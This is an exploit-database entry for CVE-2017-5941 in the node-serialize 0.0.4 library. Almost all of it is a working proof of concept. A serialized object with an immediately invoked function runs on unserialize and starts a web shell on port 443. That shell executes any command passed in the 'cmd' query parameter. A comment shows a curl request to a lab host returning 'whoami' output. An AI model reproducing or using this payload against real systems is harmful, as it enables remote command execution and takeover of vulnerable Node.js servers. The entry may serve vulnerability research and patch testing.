# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (3)
# Date: 17.06.2021
# Exploit Author: Beren Kuday GORUN
# Vendor Homepage: https://github.com/luin/serialize
# Software Link: https://github.com/luin/serialize
# Version: 0.0.4
# Tested on: Windows & Ubuntu
# CVE : 2017-5941

var serialize = require('node-serialize');
var payload = {
    "webShell" : "_$$ND_FUNC$$_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()"
    }
serialize.unserialize(serialize.serialize(payload))

/*
# after being exploited

┌──(root@kali)-[/home/kali]
└─# curl http://10.0.2.4:443?cmd=whoami
nodeadmin

*/